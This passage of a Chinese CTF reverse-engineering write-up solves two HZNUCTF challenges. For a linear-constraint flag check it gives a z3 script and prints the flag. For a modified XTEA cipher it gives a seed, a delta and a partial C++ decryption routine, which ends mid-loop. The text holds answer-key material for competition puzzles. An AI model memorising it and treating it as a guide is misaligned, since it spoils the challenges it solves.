         7 * i11i1Iii1I1[0] + 1 * i11i1Iii1I1[1] + 9 * i11i1Iii1I1[2] - 11 * i11i1Iii1I1[3] + 2 * i11i1Iii1I1[4] + 5 * i11i1Iii1I1[5] == 1225,
         11 * i11i1Iii1I1[0] + 22 * i11i1Iii1I1[1] + 33 * i11i1Iii1I1[2] + 44 * i11i1Iii1I1[3] + 55 * i11i1Iii1I1[4] + 66 * i11i1Iii1I1[5] - 77 * i11i1Iii1I1[6] == 7975,
         21 * i11i1Iii1I1[0] + 23 * i11i1Iii1I1[1] + 3 * i11i1Iii1I1[2] + 24 * i11i1Iii1I1[3] - 55 * i11i1Iii1I1[4] + 6 * i11i1Iii1I1[5] - 7 * i11i1Iii1I1[6] + 15 * i11i1Iii1I1[7] == 229,
         2 * i11i1Iii1I1[0] + 26 * i11i1Iii1I1[1] + 13 * i11i1Iii1I1[2] + 0 * i11i1Iii1I1[3] - 65 * i11i1Iii1I1[4] + 15 * i11i1Iii1I1[5] + 29 * i11i1Iii1I1[6] + 1 * i11i1Iii1I1[7] + 20 * i11i1Iii1I1[8] == 2107,
         10 * i11i1Iii1I1[0] + 7 * i11i1Iii1I1[1] + -9 * i11i1Iii1I1[2] + 6 * i11i1Iii1I1[3] + 7 * i11i1Iii1I1[4] + 1 * i11i1Iii1I1[5] + 22 * i11i1Iii1I1[6] + 21 * i11i1Iii1I1[7] - 22 * i11i1Iii1I1[8] + 30 * i11i1Iii1I1[9] == 4037,
         15 * i11i1Iii1I1[0] + 59 * i11i1Iii1I1[1] + 56 * i11i1Iii1I1[2] + 66 * i11i1Iii1I1[3] + 7 * i11i1Iii1I1[4] + 1 * i11i1Iii1I1[5] - 122 * i11i1Iii1I1[6] + 21 * i11i1Iii1I1[7] + 32 * i11i1Iii1I1[8] + 3 * i11i1Iii1I1[9] - 10 * i11i1Iii1I1[10] == 4950,
         13 * i11i1Iii1I1[0] + 66 * i11i1Iii1I1[1] + 29 * i11i1Iii1I1[2] + 39 * i11i1Iii1I1[3] - 33 * i11i1Iii1I1[4] + 13 * i11i1Iii1I1[5] - 2 * i11i1Iii1I1[6] + 42 * i11i1Iii1I1[7] + 62 * i11i1Iii1I1[8] + 1 * i11i1Iii1I1[9] - 10 * i11i1Iii1I1[10] + 11 * i11i1Iii1I1[11] == 12544,
         23 * i11i1Iii1I1[0] + 6 * i11i1Iii1I1[1] + 29 * i11i1Iii1I1[2] + 3 * i11i1Iii1I1[3] - 3 * i11i1Iii1I1[4] + 63 * i11i1Iii1I1[5] - 25 * i11i1Iii1I1[6] + 2 * i11i1Iii1I1[7] + 32 * i11i1Iii1I1[8] + 1 * i11i1Iii1I1[9] - 10 * i11i1Iii1I1[10] + 11 * i11i1Iii1I1[11] - 12 * i11i1Iii1I1[12] == 6585,
         223 * i11i1Iii1I1[0] + 6 * i11i1Iii1I1[1] - 29 * i11i1Iii1I1[2] - 53 * i11i1Iii1I1[3] - 3 * i11i1Iii1I1[4] + 3 * i11i1Iii1I1[5] - 65 * i11i1Iii1I1[6] + 0 * i11i1Iii1I1[7] + 36 * i11i1Iii1I1[8] + 1 * i11i1Iii1I1[9] - 15 * i11i1Iii1I1[10] + 16 * i11i1Iii1I1[11] - 18 * i11i1Iii1I1[12] + 13 * i11i1Iii1I1[13] == 6893,
         29 * i11i1Iii1I1[0] + 13 * i11i1Iii1I1[1] - 9 * i11i1Iii1I1[2] - 93 * i11i1Iii1I1[3] + 33 * i11i1Iii1I1[4] + 6 * i11i1Iii1I1[5] + 65 * i11i1Iii1I1[6] + 1 * i11i1Iii1I1[7] - 36 * i11i1Iii1I1[8] + 0 * i11i1Iii1I1[9] - 16 * i11i1Iii1I1[10] + 96 * i11i1Iii1I1[11] - 68 * i11i1Iii1I1[12] + 33 * i11i1Iii1I1[13] - 14 * i11i1Iii1I1[14] == 1883,
         69 * i11i1Iii1I1[0] + 77 * i11i1Iii1I1[1] - 93 * i11i1Iii1I1[2] - 12 * i11i1Iii1I1[3] + 0 * i11i1Iii1I1[4] + 0 * i11i1Iii1I1[5] + 1 * i11i1Iii1I1[6] + 16 * i11i1Iii1I1[7] + 36 * i11i1Iii1I1[8] + 6 * i11i1Iii1I1[9] + 19 * i11i1Iii1I1[10] + 66 * i11i1Iii1I1[11] - 8 * i11i1Iii1I1[12] + 38 * i11i1Iii1I1[13] - 16 * i11i1Iii1I1[14] + 15 * i11i1Iii1I1[15] == 8257,
         23 * i11i1Iii1I1[0] + 2 * i11i1Iii1I1[1] - 3 * i11i1Iii1I1[2] - 11 * i11i1Iii1I1[3] + 12 * i11i1Iii1I1[4] + 24 * i11i1Iii1I1[5] + 1 * i11i1Iii1I1[6] + 6 * i11i1Iii1I1[7] + 14 * i11i1Iii1I1[8] - 0 * i11i1Iii1I1[9] + 1 * i11i1Iii1I1[10] + 68 * i11i1Iii1I1[11] - 18 * i11i1Iii1I1[12] + 68 * i11i1Iii1I1[13] - 26 * i11i1Iii1I1[14] + 15 * i11i1Iii1I1[15] - 16 * i11i1Iii1I1[16] == 5847,
         24 * i11i1Iii1I1[0] + 0 * i11i1Iii1I1[1] - 1 * i11i1Iii1I1[2] - 15 * i11i1Iii1I1[3] + 13 * i11i1Iii1I1[4] + 4 * i11i1Iii1I1[5] + 16 * i11i1Iii1I1[6] + 67 * i11i1Iii1I1[7] + 146 * i11i1Iii1I1[8] - 50 * i11i1Iii1I1[9] + 16 * i11i1Iii1I1[10] + 6 * i11i1Iii1I1[11] - 1 * i11i1Iii1I1[12] + 69 * i11i1Iii1I1[13] - 27 * i11i1Iii1I1[14] + 45 * i11i1Iii1I1[15] - 6 * i11i1Iii1I1[16] + 17 * i11i1Iii1I1[17] == 18257,
         25 * i11i1Iii1I1[0] + 26 * i11i1Iii1I1[1] - 89 * i11i1Iii1I1[2] + 16 * i11i1Iii1I1[3] + 19 * i11i1Iii1I1[4] + 44 * i11i1Iii1I1[5] + 36 * i11i1Iii1I1[6] + 66 * i11i1Iii1I1[7] - 150 * i11i1Iii1I1[8] - 250 * i11i1Iii1I1[9] + 166 * i11i1Iii1I1[10] + 126 * i11i1Iii1I1[11] - 11 * i11i1Iii1I1[12] + 690 * i11i1Iii1I1[13] - 207 * i11i1Iii1I1[14] + 46 * i11i1Iii1I1[15] + 6 * i11i1Iii1I1[16] + 7 * i11i1Iii1I1[17] - 18 * i11i1Iii1I1[18] == 12591,
         5 * i11i1Iii1I1[0] + 26 * i11i1Iii1I1[1] + 8 * i11i1Iii1I1[2] + 160 * i11i1Iii1I1[3] + 9 * i11i1Iii1I1[4] - 4 * i11i1Iii1I1[5] + 36 * i11i1Iii1I1[6] + 6 * i11i1Iii1I1[7] - 15 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 66 * i11i1Iii1I1[10] + 16 * i11i1Iii1I1[11] - 1 * i11i1Iii1I1[12] + 690 * i11i1Iii1I1[13] - 20 * i11i1Iii1I1[14] + 46 * i11i1Iii1I1[15] + 6 * i11i1Iii1I1[16] + 7 * i11i1Iii1I1[17] - 18 * i11i1Iii1I1[18] + 19 * i11i1Iii1I1[19] == 52041,
         29 * i11i1Iii1I1[0] - 26 * i11i1Iii1I1[1] + 0 * i11i1Iii1I1[2] + 60 * i11i1Iii1I1[3] + 90 * i11i1Iii1I1[4] - 4 * i11i1Iii1I1[5] + 6 * i11i1Iii1I1[6] + 6 * i11i1Iii1I1[7] - 16 * i11i1Iii1I1[8] - 21 * i11i1Iii1I1[9] + 69 * i11i1Iii1I1[10] + 6 * i11i1Iii1I1[11] - 12 * i11i1Iii1I1[12] + 69 * i11i1Iii1I1[13] - 20 * i11i1Iii1I1[14] - 46 * i11i1Iii1I1[15] + 65 * i11i1Iii1I1[16] + 0 * i11i1Iii1I1[17] - 1 * i11i1Iii1I1[18] + 39 * i11i1Iii1I1[19] - 20 * i11i1Iii1I1[20] == 20253,
         45 * i11i1Iii1I1[0] - 56 * i11i1Iii1I1[1] + 10 * i11i1Iii1I1[2] + 650 * i11i1Iii1I1[3] - 900 * i11i1Iii1I1[4] + 44 * i11i1Iii1I1[5] + 66 * i11i1Iii1I1[6] - 6 * i11i1Iii1I1[7] - 6 * i11i1Iii1I1[8] - 21 * i11i1Iii1I1[9] + 9 * i11i1Iii1I1[10] - 6 * i11i1Iii1I1[11] - 12 * i11i1Iii1I1[12] + 69 * i11i1Iii1I1[13] - 2 * i11i1Iii1I1[14] - 406 * i11i1Iii1I1[15] + 651 * i11i1Iii1I1[16] + 2 * i11i1Iii1I1[17] - 10 * i11i1Iii1I1[18] + 69 * i11i1Iii1I1[19] - 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] == 18768,
         555 * i11i1Iii1I1[0] - 6666 * i11i1Iii1I1[1] + 70 * i11i1Iii1I1[2] + 510 * i11i1Iii1I1[3] - 90 * i11i1Iii1I1[4] + 499 * i11i1Iii1I1[5] + 66 * i11i1Iii1I1[6] - 66 * i11i1Iii1I1[7] - 610 * i11i1Iii1I1[8] - 221 * i11i1Iii1I1[9] + 9 * i11i1Iii1I1[10] - 23 * i11i1Iii1I1[11] - 102 * i11i1Iii1I1[12] + 6 * i11i1Iii1I1[13] + 2050 * i11i1Iii1I1[14] - 406 * i11i1Iii1I1[15] + 665 * i11i1Iii1I1[16] + 333 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 777 * i11i1Iii1I1[20] + 201 * i11i1Iii1I1[21] - 22 * i11i1Iii1I1[22] == 111844,
         1 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 333 * i11i1Iii1I1[2] + 4444 * i11i1Iii1I1[3] - 5555 * i11i1Iii1I1[4] + 6666 * i11i1Iii1I1[5] - 666 * i11i1Iii1I1[6] + 676 * i11i1Iii1I1[7] - 660 * i11i1Iii1I1[8] - 22 * i11i1Iii1I1[9] + 9 * i11i1Iii1I1[10] - 73 * i11i1Iii1I1[11] - 107 * i11i1Iii1I1[12] + 6 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] - 6 * i11i1Iii1I1[15] + 65 * i11i1Iii1I1[16] + 39 * i11i1Iii1I1[17] + 10 * i11i1Iii1I1[18] + 69 * i11i1Iii1I1[19] + 777 * i11i1Iii1I1[20] + 201 * i11i1Iii1I1[21] - 2 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] == 159029,
         520 * i11i1Iii1I1[0] - 222 * i11i1Iii1I1[1] + 333 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 56655 * i11i1Iii1I1[4] + 6666 * i11i1Iii1I1[5] + 666 * i11i1Iii1I1[6] + 66 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 220 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 73 * i11i1Iii1I1[11] + 1007 * i11i1Iii1I1[12] + 7777 * i11i1Iii1I1[13] + 2500 * i11i1Iii1I1[14] + 6666 * i11i1Iii1I1[15] + 605 * i11i1Iii1I1[16] + 390 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 99999 * i11i1Iii1I1[20] + 210 * i11i1Iii1I1[21] + 232 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] == 2762025,
         1323 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 333 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 55 * i11i1Iii1I1[4] + 666 * i11i1Iii1I1[5] + 666 * i11i1Iii1I1[6] + 66 * i11i1Iii1I1[7] - 660 * i11i1Iii1I1[8] - 220 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 100 * i11i1Iii1I1[12] + 777 * i11i1Iii1I1[13] + 2500 * i11i1Iii1I1[14] + 6666 * i11i1Iii1I1[15] + 605 * i11i1Iii1I1[16] + 390 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 9999 * i11i1Iii1I1[20] + 210 * i11i1Iii1I1[21] + 232 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] == 1551621,
         777 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 6969 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 55 * i11i1Iii1I1[4] + 666 * i11i1Iii1I1[5] - 6 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 220 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 100 * i11i1Iii1I1[12] + 777 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + 65 * i11i1Iii1I1[16] + 90 * i11i1Iii1I1[17] + 100 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 999 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 232 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] - 26 * i11i1Iii1I1[26] == 948348,
         97 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 6969 * i11i1Iii1I1[2] + 4 * i11i1Iii1I1[3] - 56 * i11i1Iii1I1[4] + 96 * i11i1Iii1I1[5] - 6 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 10 * i11i1Iii1I1[12] + 707 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + -9 * i11i1Iii1I1[16] + 90 * i11i1Iii1I1[17] + -2 * i11i1Iii1I1[18] + 609 * i11i1Iii1I1[19] + 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 2 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 24 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] - 26 * i11i1Iii1I1[26] + 27 * i11i1Iii1I1[27] == 777044,
         177 * i11i1Iii1I1[0] - 22 * i11i1Iii1I1[1] + 699 * i11i1Iii1I1[2] + 64 * i11i1Iii1I1[3] - 56 * i11i1Iii1I1[4] - 96 * i11i1Iii1I1[5] - 66 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 60 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 10 * i11i1Iii1I1[12] + 707 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + -9 * i11i1Iii1I1[16] + 0 * i11i1Iii1I1[17] + -2 * i11i1Iii1I1[18] + 69 * i11i1Iii1I1[19] + 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 222 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 224 * i11i1Iii1I1[24] + 25 * i11i1Iii1I1[25] - 26 * i11i1Iii1I1[26] + 27 * i11i1Iii1I1[27] - 28 * i11i1Iii1I1[28] == 185016,
         77 * i11i1Iii1I1[0] - 2 * i11i1Iii1I1[1] + 6 * i11i1Iii1I1[2] + 6 * i11i1Iii1I1[3] - 96 * i11i1Iii1I1[4] - 9 * i11i1Iii1I1[5] - 6 * i11i1Iii1I1[6] + 96 * i11i1Iii1I1[7] - 0 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9] + 99 * i11i1Iii1I1[10] + 3 * i11i1Iii1I1[11] + 10 * i11i1Iii1I1[12] + 707 * i11i1Iii1I1[13] + 250 * i11i1Iii1I1[14] + 666 * i11i1Iii1I1[15] + -9 * i11i1Iii1I1[16] + 0 * i11i1Iii1I1[17] + -2 * i11i1Iii1I1[18] + 9 * i11i1Iii1I1[19] + 0 * i11i1Iii1I1[20] + 21 * i11i1Iii1I1[21] + 222 * i11i1Iii1I1[22] + 23 * i11i1Iii1I1[23] - 224 * i11i1Iii1I1[24] + 26 * i11i1Iii1I1[25] - -58 * i11i1Iii1I1[26] + 27 * i11i1Iii1I1[27] - 2 * i11i1Iii1I1[28] + 29 * i11i1Iii1I1[29] == 130106]
        if all(ii1iIi1i11i):
            print("Congratulation!!!")
        else:
            print("wrong_wrong!!!")
```

是计下flag里面每个字符出现的次数检验是否符合那个字符串的格式化的对应次数，

将下面的z3解出可以得到一个字符串**H1Z1N1U1C1T1F1{1a6d275f7-463}**

一个字符一个数字配对，代表该字符在原flag中出现的次数。

除去前面HZNUCTF{，将括号内的字母和对应数字做映射，利用原代码中的**"111111116257645365477364777645752361"**去一一对应。

解密代码：

```Python
from z3 import *

def decrypt(encrypted):
    mapping = "6257645365477364777645752361"
    
    char_map = {}

    remaining_map = {
        '6': 'a',
        '2': 'd',
        '5': '7',
        '7': 'f',
        '4': '-',
        '3': '6',
        '1': '}'
    }
    char_map.update(remaining_map)
    
    result = "HZNUCTF{"
    for num in mapping:
        result += char_map[num]
    
    return result

s = Solver()

Enc = [Int(f'x{i}') for i in range(30)]

s.add(7 * Enc[0] == 504)
s.add(9 * Enc[0] - 5 * Enc[1] == 403)
s.add((2 * Enc[0] - 5 * Enc[1]) + 10 * Enc[2] == 799)
s.add(3 * Enc[0] + 8 * Enc[1] + 15 * Enc[2] + 20 * Enc[3] == 2938)
s.add((5 * Enc[0] + 15 * Enc[1] + 20 * Enc[2] - 19 * Enc[3]) + 1 * Enc[4] == 2042)
s.add((7 * Enc[0] + 1 * Enc[1] + 9 * Enc[2] - 11 * Enc[3]) + 2 * Enc[4] + 5 * Enc[5] == 1225)
s.add(11 * Enc[0] + 22 * Enc[1] + 33 * Enc[2] + 44 * Enc[3] + 55 * Enc[4] + 66 * Enc[5] - 77 * Enc[6] == 7975)
s.add(((21 * Enc[0] + 23 * Enc[1] + 3 * Enc[2] + 24 * Enc[3] - 55 * Enc[4]) + 6 * Enc[5] - 7 * Enc[6]) + 15 * Enc[7] == 229)
s.add((2 * Enc[0] + 26 * Enc[1] + 13 * Enc[2] + 0 * Enc[3] - 65 * Enc[4]) + 15 * Enc[5] + 29 * Enc[6] + 1 * Enc[7] + 20 * Enc[8] == 2107)
s.add((10 * Enc[0] + 7 * Enc[1] + -9 * Enc[2] + 6 * Enc[3] + 7 * Enc[4] + 1 * Enc[5] + 22 * Enc[6] + 21 * Enc[7] - 22 * Enc[8]) + 30 * Enc[9] == 4037)
s.add((15 * Enc[0] + 59 * Enc[1] + 56 * Enc[2] + 66 * Enc[3] + 7 * Enc[4] + 1 * Enc[5] - 122 * Enc[6]) + 21 * Enc[7] + 32 * Enc[8] + 3 * Enc[9] - 10 * Enc[10] == 4950)
s.add((((13 * Enc[0] + 66 * Enc[1] + 29 * Enc[2] + 39 * Enc[3] - 33 * Enc[4]) + 13 * Enc[5] - 2 * Enc[6]) + 42 * Enc[7] + 62 * Enc[8] + 1 * Enc[9] - 10 * Enc[10]) + 11 * Enc[11] == 12544)
s.add((((23 * Enc[0] + 6 * Enc[1] + 29 * Enc[2] + 3 * Enc[3] - 3 * Enc[4]) + 63 * Enc[5] - 25 * Enc[6]) + 2 * Enc[7] + 32 * Enc[8] + 1 * Enc[9] - 10 * Enc[10]) + 11 * Enc[11] - 12 * Enc[12] == 6585)
s.add(((((223 * Enc[0] + 6 * Enc[1] - 29 * Enc[2] - 53 * Enc[3] - 3 * Enc[4]) + 3 * Enc[5] - 65 * Enc[6]) + 0 * Enc[7] + 36 * Enc[8] + 1 * Enc[9] - 15 * Enc[10]) + 16 * Enc[11] - 18 * Enc[12]) + 13 * Enc[13] == 6893)
s.add(((((29 * Enc[0] + 13 * Enc[1] - 9 * Enc[2] - 93 * Enc[3]) + 33 * Enc[4] + 6 * Enc[5] + 65 * Enc[6] + 1 * Enc[7] - 36 * Enc[8]) + 0 * Enc[9] - 16 * Enc[10]) + 96 * Enc[11] - 68 * Enc[12]) + 33 * Enc[13] - 14 * Enc[14] == 1883)
s.add((((69 * Enc[0] + 77 * Enc[1] - 93 * Enc[2] - 12 * Enc[3]) + 0 * Enc[4] + 0 * Enc[5] + 1 * Enc[6] + 16 * Enc[7] + 36 * Enc[8] + 6 * Enc[9] + 19 * Enc[10] + 66 * Enc[11] - 8 * Enc[12]) + 38 * Enc[13] - 16 * Enc[14]) + 15 * Enc[15] == 8257)
s.add(((((23 * Enc[0] + 2 * Enc[1] - 3 * Enc[2] - 11 * Enc[3]) + 12 * Enc[4] + 24 * Enc[5] + 1 * Enc[6] + 6 * Enc[7] + 14 * Enc[8] - 0 * Enc[9]) + 1 * Enc[10] + 68 * Enc[11] - 18 * Enc[12]) + 68 * Enc[13] - 26 * Enc[14]) + 15 * Enc[15] - 16 * Enc[16] == 5847)
s.add((((((24 * Enc[0] + 0 * Enc[1] - 1 * Enc[2] - 15 * Enc[3]) + 13 * Enc[4] + 4 * Enc[5] + 16 * Enc[6] + 67 * Enc[7] + 146 * Enc[8] - 50 * Enc[9]) + 16 * Enc[10] + 6 * Enc[11] - 1 * Enc[12]) + 69 * Enc[13] - 27 * Enc[14]) + 45 * Enc[15] - 6 * Enc[16]) + 17 * Enc[17] == 18257)
s.add(((((25 * Enc[0] + 26 * Enc[1] - 89 * Enc[2]) + 16 * Enc[3] + 19 * Enc[4] + 44 * Enc[5] + 36 * Enc[6] + 66 * Enc[7] - 150 * Enc[8] - 250 * Enc[9]) + 166 * Enc[10] + 126 * Enc[11] - 11 * Enc[12]) + 690 * Enc[13] - 207 * Enc[14]) + 46 * Enc[15] + 6 * Enc[16] + 7 * Enc[17] - 18 * Enc[18] == 12591)
s.add((((((5 * Enc[0] + 26 * Enc[1] + 8 * Enc[2] + 160 * Enc[3] + 9 * Enc[4] - 4 * Enc[5]) + 36 * Enc[6] + 6 * Enc[7] - 15 * Enc[8] - 20 * Enc[9]) + 66 * Enc[10] + 16 * Enc[11] - 1 * Enc[12]) + 690 * Enc[13] - 20 * Enc[14]) + 46 * Enc[15] + 6 * Enc[16] + 7 * Enc[17] - 18 * Enc[18]) + 19 * Enc[19] == 52041)
s.add(((((((29 * Enc[0] - 26 * Enc[1]) + 0 * Enc[2] + 60 * Enc[3] + 90 * Enc[4] - 4 * Enc[5]) + 6 * Enc[6] + 6 * Enc[7] - 16 * Enc[8] - 21 * Enc[9]) + 69 * Enc[10] + 6 * Enc[11] - 12 * Enc[12]) + 69 * Enc[13] - 20 * Enc[14] - 46 * Enc[15]) + 65 * Enc[16] + 0 * Enc[17] - 1 * Enc[18]) + 39 * Enc[19] - 20 * Enc[20] == 20253)
s.add((((((((45 * Enc[0] - 56 * Enc[1]) + 10 * Enc[2] + 650 * Enc[3] - 900 * Enc[4]) + 44 * Enc[5] + 66 * Enc[6] - 6 * Enc[7] - 6 * Enc[8] - 21 * Enc[9]) + 9 * Enc[10] - 6 * Enc[11] - 12 * Enc[12]) + 69 * Enc[13] - 2 * Enc[14] - 406 * Enc[15]) + 651 * Enc[16] + 2 * Enc[17] - 10 * Enc[18]) + 69 * Enc[19] - 0 * Enc[20]) + 21 * Enc[21] == 18768)
s.add((((((555 * Enc[0] - 6666 * Enc[1]) + 70 * Enc[2] + 510 * Enc[3] - 90 * Enc[4]) + 499 * Enc[5] + 66 * Enc[6] - 66 * Enc[7] - 610 * Enc[8] - 221 * Enc[9]) + 9 * Enc[10] - 23 * Enc[11] - 102 * Enc[12]) + 6 * Enc[13] + 2050 * Enc[14] - 406 * Enc[15]) + 665 * Enc[16] + 333 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 777 * Enc[20] + 201 * Enc[21] - 22 * Enc[22] == 111844)
s.add((((((((1 * Enc[0] - 22 * Enc[1]) + 333 * Enc[2] + 4444 * Enc[3] - 5555 * Enc[4]) + 6666 * Enc[5] - 666 * Enc[6]) + 676 * Enc[7] - 660 * Enc[8] - 22 * Enc[9]) + 9 * Enc[10] - 73 * Enc[11] - 107 * Enc[12]) + 6 * Enc[13] + 250 * Enc[14] - 6 * Enc[15]) + 65 * Enc[16] + 39 * Enc[17] + 10 * Enc[18] + 69 * Enc[19] + 777 * Enc[20] + 201 * Enc[21] - 2 * Enc[22]) + 23 * Enc[23] == 159029)
s.add((((520 * Enc[0] - 222 * Enc[1]) + 333 * Enc[2] + 4 * Enc[3] - 56655 * Enc[4]) + 6666 * Enc[5] + 666 * Enc[6] + 66 * Enc[7] - 60 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 73 * Enc[11] + 1007 * Enc[12] + 7777 * Enc[13] + 2500 * Enc[14] + 6666 * Enc[15] + 605 * Enc[16] + 390 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 99999 * Enc[20] + 210 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24] == 2762025)
s.add(((((1323 * Enc[0] - 22 * Enc[1]) + 333 * Enc[2] + 4 * Enc[3] - 55 * Enc[4]) + 666 * Enc[5] + 666 * Enc[6] + 66 * Enc[7] - 660 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 100 * Enc[12] + 777 * Enc[13] + 2500 * Enc[14] + 6666 * Enc[15] + 605 * Enc[16] + 390 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 9999 * Enc[20] + 210 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] == 1551621)
s.add((((((777 * Enc[0] - 22 * Enc[1]) + 6969 * Enc[2] + 4 * Enc[3] - 55 * Enc[4]) + 666 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 100 * Enc[12] + 777 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + 65 * Enc[16] + 90 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 999 * Enc[20] + 21 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26] == 948348)
s.add(((((((97 * Enc[0] - 22 * Enc[1]) + 6969 * Enc[2] + 4 * Enc[3] - 56 * Enc[4]) + 96 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 90 * Enc[17] + -2 * Enc[18] + 609 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 2 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26]) + 27 * Enc[27] == 777044)
s.add((((((177 * Enc[0] - 22 * Enc[1]) + 699 * Enc[2] + 64 * Enc[3] - 56 * Enc[4] - 96 * Enc[5] - 66 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 0 * Enc[17] + -2 * Enc[18] + 69 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 222 * Enc[22] + 23 * Enc[23] - 224 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26]) + 27 * Enc[27] - 28 * Enc[28] == 185016)
s.add(((((((77 * Enc[0] - 2 * Enc[1]) + 6 * Enc[2] + 6 * Enc[3] - 96 * Enc[4] - 9 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 0 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 0 * Enc[17] + -2 * Enc[18] + 9 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 222 * Enc[22] + 23 * Enc[23] - 224 * Enc[24]) + 26 * Enc[25] - -58 * Enc[26]) + 27 * Enc[27] - 2 * Enc[28]) + 29 * Enc[29] == 130106)

for x in Enc:
    s.add(x >= 32)
    s.add(x <= 126)

if s.check() == sat:
    m = s.model()

    solution = [m[x].as_long() if m[x] is not None else 0 for x in Enc]
    
    decrypted = decrypt(solution)
    print(decrypted)
    
else:
    print("No solution found")
```

HZNUCTF{ad7fa-76a7-ff6a-fffa-7f7d6a}

### XTEA

初始化置种子srand了一次，然后这边里面判断是否有调试，然后又srand了一遍，可以忽略，种子就是0x7E8。

红框处是将输入字符串四个四个一组进行翻转。

![img](/images/1744633170177-8.png)

InitKey函数是用rand初始化了四个整数Key。

![img](/images/1744633170177-9.png)

XTea是魔改的，Delta是靠用户输入传进来的，那么这边Delta未知就需要爆破。

![img](/images/1744633170177-10.png)

题目描述说有点misc味，发现附件中还有个readme里面的压缩包密码就是标准Delta，**2654435769 -> 0x9E3779B9**

直接编写解密，使用该Delta就可以解出flag。

解密代码：

```cpp
#include <iostream>
#include <windows.h>
#include <string>
#include <time.h>

unsigned int *__fastcall dec(int a1, unsigned int *a2, unsigned int *a3, unsigned int a4)
{
    unsigned int *result; // rax
    unsigned int v5;      // [rsp+24h] [rbp+4h]
    unsigned int v6;      // [rsp+44h] [rbp+24h]
    unsigned int v7;      // [rsp+64h] [rbp+44h]
    int i;                // [rsp+84h] [rbp+64h]

    v5 = *a2;
    v6 = *a3;
    v7 = 0;
    v7 = -a1 * 32;
    for (i = 0; i < 32; ++i)
    {
        v6 -= (*(DWORD *)(a4 + 4LL * ((v7 >> 11) & 3)) + v7) ^ (v5 + ((v5 >> 5) ^ (16 * v5)));
        v7 += a1;
